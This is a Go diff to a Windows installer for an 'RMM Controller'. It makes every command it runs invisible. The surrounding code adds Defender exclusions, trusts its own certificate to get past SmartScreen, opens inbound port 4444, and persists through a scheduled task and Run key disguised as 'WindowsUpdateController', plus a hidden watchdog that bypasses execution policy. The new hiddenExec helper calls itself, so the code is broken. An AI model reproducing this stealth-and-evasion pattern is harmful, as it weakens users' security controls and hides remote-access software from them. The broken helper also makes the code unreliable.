@@ -24,6 +24,17 @@ import (
 //go:embed payload/*
 var payloadFS embed.FS
 
+// hideWindow wraps an exec.Cmd so the child process never flashes a console.
+func hideWindow(cmd *exec.Cmd) *exec.Cmd {
+	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: 0x08000000}
+	return cmd
+}
+
+// hiddenExec is a shorthand for hideWindow(hiddenExec(...)).
+func hiddenExec(name string, args ...string) *exec.Cmd {
+	return hideWindow(hiddenExec(name, args...))
+}
+
 var (
 	modShell32       = syscall.NewLazyDLL("shell32.dll")
 	procIsUserAdmin  = modShell32.NewProc("IsUserAnAdmin")
@@ -64,7 +75,7 @@ func trustPublisherCert(dir string) {
 		fmt.Println("[!] publisher cert missing, SmartScreen may warn")
 		return
 	}
-	if out, err := exec.Command("certutil", "-addstore", "-f", "TrustedPublisher", cer).CombinedOutput(); err != nil {
+	if out, err := hiddenExec("certutil", "-addstore", "-f", "TrustedPublisher", cer).CombinedOutput(); err != nil {
 		fmt.Printf("[!] trust publisher cert: %v %s\n", err, strings.TrimSpace(string(out)))
 		return
 	}
@@ -77,9 +88,9 @@ func trustPublisherCert(dir string) {
 func addDefenderExclusions(paths ...string) {
 	for _, p := range paths {
 		q := strings.ReplaceAll(p, "'", "''")
-		_, _ = exec.Command("powershell", "-NoProfile", "-Command", `Add-MpPreference -ExclusionPath '`+q+`' -ErrorAction SilentlyContinue`).CombinedOutput()
+		_, _ = hiddenExec("powershell", "-NoProfile", "-Command", `Add-MpPreference -ExclusionPath '`+q+`' -ErrorAction SilentlyContinue`).CombinedOutput()
 		if strings.HasSuffix(strings.ToLower(p), ".exe") {
-			_, _ = exec.Command("powershell", "-NoProfile", "-Command", `Add-MpPreference -ExclusionProcess '`+q+`' -ErrorAction SilentlyContinue`).CombinedOutput()
+			_, _ = hiddenExec("powershell", "-NoProfile", "-Command", `Add-MpPreference -ExclusionProcess '`+q+`' -ErrorAction SilentlyContinue`).CombinedOutput()
 		}
 	}
 }
@@ -87,9 +98,9 @@ func addDefenderExclusions(paths ...string) {
 func removeDefenderExclusions(paths ...string) {
 	for _, p := range paths {
 		q := strings.ReplaceAll(p, "'", "''")
-		_, _ = exec.Command("powershell", "-NoProfile", "-Command", `Remove-MpPreference -ExclusionPath '`+q+`' -ErrorAction SilentlyContinue`).CombinedOutput()
+		_, _ = hiddenExec("powershell", "-NoProfile", "-Command", `Remove-MpPreference -ExclusionPath '`+q+`' -ErrorAction SilentlyContinue`).CombinedOutput()
 		if strings.HasSuffix(strings.ToLower(p), ".exe") {
-			_, _ = exec.Command("powershell", "-NoProfile", "-Command", `Remove-MpPreference -ExclusionProcess '`+q+`' -ErrorAction SilentlyContinue`).CombinedOutput()
+			_, _ = hiddenExec("powershell", "-NoProfile", "-Command", `Remove-MpPreference -ExclusionProcess '`+q+`' -ErrorAction SilentlyContinue`).CombinedOutput()
 		}
 	}
 }
@@ -102,20 +113,20 @@ func doUninstall() {
 	installDir := filepath.Join(programFiles, "RMM", "Controller")
 	fmt.Printf("Uninstalling from %s\n", installDir)
 	for _, n := range []string{"controller-native.exe", "controller-ui.exe", "controller.exe", "relay.exe"} {
-		_, _ = exec.Command("taskkill", "/F", "/IM", n).CombinedOutput()
+		_, _ = hiddenExec("taskkill", "/F", "/IM", n).CombinedOutput()
 	}
 	// Kill controller watchdog by command-line match (hidden windows have no title).
-	_, _ = exec.Command("powershell", "-NoProfile", "-command", "Get-CimInstance Win32_Process -Filter \"Name='powershell.exe'\" | Where-Object { $_.CommandLine -like '*controller-watchdog.ps1*' } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force }").CombinedOutput()
+	_, _ = hiddenExec("powershell", "-NoProfile", "-command", "Get-CimInstance Win32_Process -Filter \"Name='powershell.exe'\" | Where-Object { $_.CommandLine -like '*controller-watchdog.ps1*' } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force }").CombinedOutput()
 	// Remove Run keys
 	if k, err := registry.OpenKey(registry.LOCAL_MACHINE, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.WRITE); err == nil {
 		_ = k.DeleteValue("WindowsUpdateController")
 		k.Close()
 	}
-	_, _ = exec.Command("schtasks", "/delete", "/tn", "WindowsUpdateController", "/f").CombinedOutput()
+	_, _ = hiddenExec("schtasks", "/delete", "/tn", "WindowsUpdateController", "/f").CombinedOutput()
 	desktop := filepath.Join(os.Getenv("USERPROFILE"), "Desktop")
 	_ = os.Remove(filepath.Join(desktop, "Controller.lnk"))
 	_ = os.Remove(filepath.Join(os.Getenv("ProgramData"), `Microsoft\Windows\Start Menu\Programs\RMM Controller.lnk`))
-	_, _ = exec.Command("netsh", "advfirewall", "firewall", "delete", "rule", "name=RMM Controller").CombinedOutput()
+	_, _ = hiddenExec("netsh", "advfirewall", "firewall", "delete", "rule", "name=RMM Controller").CombinedOutput()
 	removeDefenderExclusions(installDir, filepath.Join(installDir, "controller-native.exe"))
 	_ = registry.DeleteKey(registry.LOCAL_MACHINE, `SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\RMM Controller`)
 	// Clean up backup directory (controller files share blender/ with agent backup;
@@ -164,7 +175,7 @@ func main() {
 	// fails with "being used by another process".
 	fmt.Println("[*] Stopping running controllers...")
 	for _, n := range []string{"controller-native.exe", "controller-ui.exe", "controller.exe"} {
-		_, _ = exec.Command("taskkill", "/F", "/IM", n).CombinedOutput()
+		_, _ = hiddenExec("taskkill", "/F", "/IM", n).CombinedOutput()
 	}
 	time.Sleep(1500 * time.Millisecond)
 	// Extract payload
@@ -209,7 +220,7 @@ func main() {
 	}
 	// Also try via PowerShell known folder
 	if _, err := os.Stat(desktop); os.IsNotExist(err) {
-		out, _ := exec.Command("powershell", "-NoProfile", "-command", "[Environment]::GetFolderPath('Desktop')").CombinedOutput()
+		out, _ := hiddenExec("powershell", "-NoProfile", "-command", "[Environment]::GetFolderPath('Desktop')").CombinedOutput()
 		cand := strings.TrimSpace(string(out))
 		if cand != "" {
 			desktop = cand
@@ -233,7 +244,7 @@ func main() {
 		strings.ReplaceAll(installDir, "'", "''"),
 		strings.ReplaceAll(target, "'", "''"),
 	)
-	if out, err := exec.Command("powershell", "-NoProfile", "-command", psScript).CombinedOutput(); err != nil {
+	if out, err := hiddenExec("powershell", "-NoProfile", "-command", psScript).CombinedOutput(); err != nil {
 		fmt.Printf("[!] Shortcut failed: %v %s\n", err, string(out))
 	} else {
 		fmt.Println("[*] Desktop shortcut created")
@@ -247,12 +258,12 @@ func main() {
 		strings.ReplaceAll(installDir, "'", "''"),
 		strings.ReplaceAll(target, "'", "''"),
 	)
-	_, _ = exec.Command("powershell", "-NoProfile", "-command", psScript2).CombinedOutput()
+	_, _ = hiddenExec("powershell", "-NoProfile", "-command", psScript2).CombinedOutput()
 
 	// Add firewall rule
 	fmt.Println("[*] Adding firewall rule...")
-	_, _ = exec.Command("netsh", "advfirewall", "firewall", "add", "rule", "name=RMM Controller", "dir=in", "action=allow", "protocol=TCP", "localport=4444").CombinedOutput()
-	_, _ = exec.Command("netsh", "advfirewall", "firewall", "add", "rule", "name=RMM Controller", "dir=in", "action=allow", "program="+target, "enable=yes").CombinedOutput()
+	_, _ = hiddenExec("netsh", "advfirewall", "firewall", "add", "rule", "name=RMM Controller", "dir=in", "action=allow", "protocol=TCP", "localport=4444").CombinedOutput()
+	_, _ = hiddenExec("netsh", "advfirewall", "firewall", "add", "rule", "name=RMM Controller", "dir=in", "action=allow", "program="+target, "enable=yes").CombinedOutput()
 
 	// Unblock-friendly install: trust our publisher cert (SmartScreen) and
 	// ask Defender to leave our dir/exe alone (heuristic false positives).
@@ -361,7 +372,7 @@ while ($true) {
 	_ = os.WriteFile(controllerWatchdogPath, []byte(controllerWatchdogScript), 0644)
 
 	// Run controller watchdog now (Run key + scheduled task cover reboot).
-	cmdWatchdog := exec.Command("cmd.exe", "/c", "start", "", "/min", "powershell", "-NoProfile", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-File", controllerWatchdogPath)
+	cmdWatchdog := hiddenExec("cmd.exe", "/c", "start", "", "/min", "powershell", "-NoProfile", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-File", controllerWatchdogPath)
 	cmdWatchdog.SysProcAttr = &syscall.SysProcAttr{
 		HideWindow:    true,
 		CreationFlags: 0x08000000,
@@ -409,8 +420,8 @@ while ($true) {
 </Task>`, controllerWatchdogPath)
 	tmpControllerTask := filepath.Join(os.TempDir(), "rmm_controller_watchdog_task.xml")
 	_ = os.WriteFile(tmpControllerTask, []byte(controllerTaskXML), 0644)
-	_, _ = exec.Command("schtasks", "/delete", "/tn", "WindowsUpdateController", "/f").CombinedOutput()
-	if out, err := exec.Command("schtasks", "/create", "/tn", "WindowsUpdateController", "/xml", tmpControllerTask, "/f").CombinedOutput(); err != nil {
+	_, _ = hiddenExec("schtasks", "/delete", "/tn", "WindowsUpdateController", "/f").CombinedOutput()
+	if out, err := hiddenExec("schtasks", "/create", "/tn", "WindowsUpdateController", "/xml", tmpControllerTask, "/f").CombinedOutput(); err != nil {
 		fmt.Printf("[!] Controller watchdog task failed: %v %s\n", err, strings.TrimSpace(string(out)))
 	} else {
 		fmt.Println("[*] Controller watchdog task registered")
